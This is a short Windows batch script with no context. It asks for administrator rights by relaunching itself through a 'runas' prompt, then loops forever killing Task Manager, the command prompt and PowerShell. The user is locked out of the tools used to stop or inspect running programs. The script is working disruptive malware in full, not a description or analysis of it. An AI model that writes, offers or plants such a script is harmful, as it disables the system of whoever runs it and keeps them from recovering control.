whoami /priv | find "SeDebugPrivilege" > nul
if %errorlevel% neq 0 (
 @powershell start-process %~0 -verb runas
 exit
)
:Label
taskkill /IM taskmgr.exe
taskkill /IM cmd.exe
taskkill /IM powershell.exe
goto :Label
pause